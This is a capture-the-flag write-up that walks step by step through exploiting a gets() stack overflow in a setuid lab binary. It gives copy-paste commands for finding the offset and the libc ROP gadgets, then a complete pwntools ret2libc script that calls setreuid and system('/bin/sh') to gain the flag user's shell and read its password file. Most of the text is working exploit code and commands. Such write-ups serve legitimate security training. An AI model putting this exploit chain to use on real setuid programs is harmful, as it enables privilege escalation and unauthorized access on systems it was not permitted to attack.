# Wintermute (level05 → flag05) — Exploit Writeup

Copy-paste each block in order, in a terminal on the target box (`level05` user).

## 1. Recon the binary

```bash
file /home/level05/wintermute
checksec --file=/home/level05/wintermute
ls -la /home/level05/wintermute
```

Expect: amd64, dynamically linked, No PIE, no canary, NX enabled, Partial RELRO, owner `flag05` with setuid bit (`-rwsr-x---`).

## 2. Find the vulnerability

```bash
objdump -d /home/level05/wintermute | less
```

`run_query()` calls `gets(query)` on a fixed-size stack buffer with no bounds checking — classic stack buffer overflow. Frame size is `sub rsp, 0x70` (112 bytes reserved above saved RBP).

## 3. Confirm the exact offset to the return address

`p.corefile` won't work on this box (apport owns the core dumps and blocks read access), so do it manually via GDB.

**3a. Generate a cyclic pattern file:**

```bash
python3 -c "from pwn import cyclic; open('/tmp/pattern','wb').write(cyclic(300))"
```

**3b. Crash it under GDB:**

```bash
gdb -nx /home/level05/wintermute
```

Inside GDB:

```
run < /tmp/pattern
```

It will SIGSEGV. Then:

```
info registers rbp rip
```

**3c. Compute the offset from the leaked RBP value** (replace the hex value with what GDB printed for `rbp`):

```bash
python3 -c "
from pwn import cyclic_find, p64, context
context.arch = 'amd64'
val = 0x6261616562616164
print('Offset to saved RBP:', cyclic_find(p64(val)))
print('Offset to return address:', cyclic_find(p64(val)) + 8)
"
```

**Confirmed for this binary: offset = 120 bytes.**

Exit GDB:

```
quit
```

## 4. Check ASLR and identify the real libc

```bash
cat /proc/sys/kernel/randomize_va_space
ldd /home/level05/wintermute
```

Expect: `0` (ASLR off), libc loaded at `0x7ffff7c00000`, binary uses `/lib/x86_64-linux-gnu/libc.so.6`.

## 5. Find ROP gadgets in that exact libc

```bash
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rdi"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rsi"
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "ret" | grep ": ret$"
```

## 6. Find function offsets in that exact libc

```bash
readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -E " system@| setreuid@| exit@"
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
```

## 7. Confirm the target UID

```bash
grep flag05 /etc/passwd
```

→ UID `1022`.

## 8. Build and run the exploit

Save as `exploit.py`, filling in any offsets from steps 5–7 if they differ from what's below (these were verified working on this box):

```python
from pwn import *

context.arch = 'amd64'

libc = 0x7ffff7c00000

ROP_RDI      = p64(libc + 0x000000000010c08d)  # pop rdi ; ret
ROP_RSI      = p64(libc + 0x0000000000110b7d)  # pop rsi ; ret
ROP_RET      = p64(libc + 0x0000000000028a92)  # ret (alignment)

ROP_SH       = p64(libc + 0x00000000001cc42f)  # "/bin/sh"
ROP_SYS      = p64(libc + 0x0000000000058750)  # system()
ROP_SETREUID = p64(libc + 0x0000000000127370)  # setreuid()
ROP_EXIT     = p64(libc + 0x0000000000047ba0)  # exit()

OWNER_UID    = p64(1022)
offset       = 120

rop_chain  = ROP_RDI + OWNER_UID + ROP_RSI + OWNER_UID + ROP_SETREUID
rop_chain += ROP_RET + ROP_RET          # fix 16-byte alignment before system()
rop_chain += ROP_RDI + ROP_SH + ROP_SYS
rop_chain += ROP_RDI + p64(0) + ROP_EXIT

payload = b'A' * offset + rop_chain

p = process("/home/level05/wintermute", env={})
p.recvuntil(b"[WINTERMUTE] Query: ")
p.sendline(payload)
p.interactive()
```

Run it:

```bash
python3 exploit.py
```

## 9. Get the flag

Once the interactive shell spawns:

```bash
id
cat /home/flag05/.pass
```

`id` should show `uid=1022(flag05)`.

---

## If it crashes instead of spawning a shell

Debug under GDB with breakpoints on `setreuid` and `system` (addresses = `libc + offset` from steps 5/6):

```bash
python3 -c "
payload = b'A'*120 + bytes.fromhex('') # paste your payload-building code here, or import from exploit.py
open('/tmp/payload','wb').write(payload)
"
gdb -nx /home/level05/wintermute
```

Inside GDB:

```
b *0x7ffff7d27370
b *0x7ffff7c58750
run < /tmp/payload
```

At each breakpoint:

```
info registers rdi rsi rip
c
```

If `rip` ends up inside a libc function like `do_system+...` rather than at your own gadget addresses, suspect **stack alignment** — `system()` needs the stack 16-byte aligned at its call site. Add or remove one `ROP_RET` in the chain and retry.